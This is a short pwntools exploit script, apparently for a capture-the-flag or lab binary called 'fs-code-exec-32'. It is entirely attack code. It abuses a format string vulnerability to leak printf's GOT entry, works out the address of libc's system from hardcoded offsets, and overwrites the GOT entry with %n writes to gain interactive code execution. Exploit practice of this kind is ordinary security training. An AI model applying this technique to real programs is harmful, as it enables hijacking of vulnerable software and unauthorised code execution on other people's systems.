#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-code-exec-32")
#context.terminal = ['tmux','splitw','-h']
#gdb.attach(p)

#AAAA at arg 7

#arbitrary read -> read GOT of printf
printf_got = p.elf.got['printf']
print(hex(printf_got))

print(p.recv())
p.sendline(p32(printf_got) + "%7$s")

data = p.recv()
print(repr(data))

#libc printf:
value = u32(data[10:14])
print(hex(value))

"""
$1 = {<text variable, no debug info>} 0xf7e37670 <__printf>
pwndbg> p system
$2 = {<text variable, no debug info>} 0xf7e28da0 <__libc_system>
"""
#addr of sys
libc_sys = value - 0xf7e37670 + 0xf7e28da0

#AAAABBBB%7$p%8$p -> 0x41414141 0x42424242

#write 2B by 2B
#buf = p32(printf_got) + p32(prinf_got + 2)
#lower 16b
lower_16_sys = libc_sys & 0xffff
first = lower_16_sys - 8
second = (libc_sys >> 16) - lower_16_sys

while second < 0:
    second += 0x10000

print(hex(first))
print(hex(second))
print(hex(libc_sys))

buf = p32(printf_got) + p32(printf_got + 2)
buf += "%" + "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"
print(buf)
p.sendline(buf)
p.interactive()

